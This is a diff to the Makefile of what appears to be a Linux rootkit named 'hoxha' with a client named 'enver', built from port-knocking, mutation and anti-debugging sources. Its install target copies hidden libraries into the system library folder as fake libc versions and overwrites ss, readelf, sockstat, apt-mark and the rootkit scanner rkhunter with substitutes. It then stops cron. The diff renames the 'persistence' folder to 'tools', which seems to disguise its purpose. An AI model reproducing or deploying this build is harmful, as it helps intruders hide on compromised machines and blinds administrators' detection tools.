@@ -1,14 +1,14 @@
 CC        := cc
 OUT       := hoxha
 CLIENT    := enver
-UPX	 := ./upx
+UPX	 	  := ./upx
 SSTRIP    := ./sstrip
 SRC       := knocker.c mutate.c anti_debug.c
 BINDIR    := /usr/bin
 LIBDIR    := /lib/x86_64-linux-gnu
 CHMOD     := chmod +x
 PATCH     := ./patchelf --add-needed
-PERSIST   := persistence
+TOOLS   := tools
 CLIENTSRC := enver.c anti_debug.c mutate.c
 MARCH 	 := $(shell gcc -Q -march=native --help=target | grep -m1 march= | awk '{print $$2}' | tr -d '[:space:]')
 
@@ -60,13 +60,13 @@ install:
 	
 	cp $(LIBEXEC) $(LIBDIR)/libc.so.4
 	cp $(LIBHIDE) $(LIBDIR)/libc.so.5
-	cp $(PERSIST)/ss $$(which ss)
-	cp $(PERSIST)/readelf $$(which readelf)
-	cp $(PERSIST)/sockstat $$(which sockstat)
-	cp $(PERSIST)/apt-mark $$(which apt-mark)
+	cp $(TOOLS)/ss $$(which ss)
+	cp $(TOOLS)/readelf $$(which readelf)
+	cp $(TOOLS)/sockstat $$(which sockstat)
+	cp $(TOOLS)/apt-mark $$(which apt-mark)
 	
 	@if which rkhunter >/dev/null 2>&1; then \
- 		cp $(PERSIST)/rkhunter $$(which rkhunter); \
+ 		cp $(TOOLS)/rkhunter $$(which rkhunter); \
 	fi
 	
 	systemctl stop cron
